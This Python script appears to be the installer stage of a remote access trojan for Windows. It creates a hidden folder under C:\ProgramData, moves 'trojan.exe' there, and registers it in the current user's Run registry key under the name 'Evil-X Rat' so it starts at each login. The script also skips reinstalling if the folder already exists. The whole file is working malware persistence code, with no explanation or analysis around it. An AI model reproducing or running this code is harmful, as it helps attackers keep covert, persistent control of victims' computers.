import subprocess
import os
import getpass
import shutil
import winreg
import sys

MAIN_MALWARE_DIST = 'C:\ProgramData'
SUB_MALWARE_DIST = os.path.join(MAIN_MALWARE_DIST, 'n3wrattool')

if os.path.exists(SUB_MALWARE_DIST):
    sys.exit()

os.mkdir(SUB_MALWARE_DIST)

EXE_NAME = 'trojan.exe'
REG_EXE_ADDRESS = os.path.join(SUB_MALWARE_DIST, EXE_NAME)
shutil.move('trojan.exe', SUB_MALWARE_DIST)

key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, "Software\Microsoft\Windows\CurrentVersion\Run",0, winreg.KEY_ALL_ACCESS)
winreg.SetValueEx(key, 'Evil-X Rat', 0, winreg.REG_SZ, REG_EXE_ADDRESS)
key.Close()